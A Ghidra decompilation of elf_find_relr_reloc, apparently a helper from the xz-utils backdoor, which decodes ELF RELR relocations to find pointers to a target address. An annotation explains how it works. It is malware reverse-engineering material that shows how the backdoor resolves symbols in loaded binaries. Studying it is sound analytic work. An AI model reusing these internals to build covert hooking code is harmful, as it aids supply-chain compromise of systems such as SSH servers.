// /home/kali/xzre-ghidra/xzregh/101C30_elf_find_relr_reloc.c
// Function: elf_find_relr_reloc @ 0x101C30
// Calling convention: __stdcall
// Prototype: Elf64_Relr * __stdcall elf_find_relr_reloc(elf_info_t * elf_info, EncodedStringId encoded_string_id)


/*
 * AutoDoc: Performs the same search as `elf_find_rela_reloc` but against the packed RELR format. It replays the RELR decoding algorithm
 * (literal entry vs bitmap entry), sanity-checks each decoded pointer with `elf_contains_vaddr`, compares the pointed-to value
 * against the requested target address, and optionally enforces a lower/upper bound plus an iteration cursor via the extra
 * argument registers. Returning NULL means there were no RELR records, the address never appeared in the run, or one of the
 * decoded pointers failed validation.
 */

#include "xzre_types.h"

Elf64_Relr * elf_find_relr_reloc(elf_info_t *elf_info,EncodedStringId encoded_string_id)

{
  uint relr_count;
  Elf64_Ehdr *elfbase;
  BOOL addr_ok;
  u8 *result_upper_bound;
  u8 *result_lower_bound;
  ulong relr_index;
  u32 target_addr_high;
  u8 *candidate_ptr;
  ulong *resume_index_ptr;
  long relr_offset;
  u64 target_offset;
  ulong encoded_entry;
  
  elfbase = elf_info->elfbase;
  if ((elf_info->flags & 4) != 0) {
    relr_count = elf_info->relr_relocs_num;
    if ((CONCAT44(target_addr_high,encoded_string_id) != 0) && (relr_count != 0)) {
      relr_index = 0;
      if (resume_index_ptr != (ulong *)0x0) {
        relr_index = *resume_index_ptr;
      }
      target_offset = CONCAT44(target_addr_high,encoded_string_id) - (long)elfbase;
      relr_offset = 0;
      for (; relr_index < relr_count; relr_index = relr_index + 1) {
        candidate_ptr = elfbase->e_ident + relr_offset;
        encoded_entry = elf_info->relr_relocs[relr_index];
        if ((encoded_entry & 1) == 0) {
          candidate_ptr = elfbase->e_ident + encoded_entry;
          addr_ok = elf_contains_vaddr(elf_info,candidate_ptr,8,4);
          if (addr_ok == FALSE) {
            return (Elf64_Relr *)0x0;
          }
          if ((*(Elf64_Relr *)candidate_ptr == target_offset) &&
             ((result_lower_bound == (Elf64_Relr *)0x0 || ((result_lower_bound <= candidate_ptr && (candidate_ptr <= result_upper_bound)))))) {
LAB_00101d98:
            if (resume_index_ptr != (ulong *)0x0) {
              *resume_index_ptr = relr_index + 1;
              return (Elf64_Relr *)candidate_ptr;
            }
            return (Elf64_Relr *)candidate_ptr;
          }
          relr_offset = encoded_entry + 8;
        }
        else {
          while (encoded_entry = encoded_entry >> 1, encoded_entry != 0) {
            if ((encoded_entry & 1) != 0) {
              addr_ok = elf_contains_vaddr(elf_info,candidate_ptr,8,4);
              if (addr_ok == FALSE) {
                return (Elf64_Relr *)0x0;
              }
              if ((*(Elf64_Relr *)candidate_ptr == target_offset) &&
                 ((result_lower_bound == (Elf64_Relr *)0x0 || ((result_lower_bound <= candidate_ptr && (candidate_ptr <= result_upper_bound))))))
              goto LAB_00101d98;
            }
            candidate_ptr = candidate_ptr + 8;
          }
          relr_offset = relr_offset + 0x1f8;
        }
      }
      if (resume_index_ptr != (ulong *)0x0) {
        *resume_index_ptr = relr_index;
      }
    }
  }
  return (Elf64_Relr *)0x0;
}

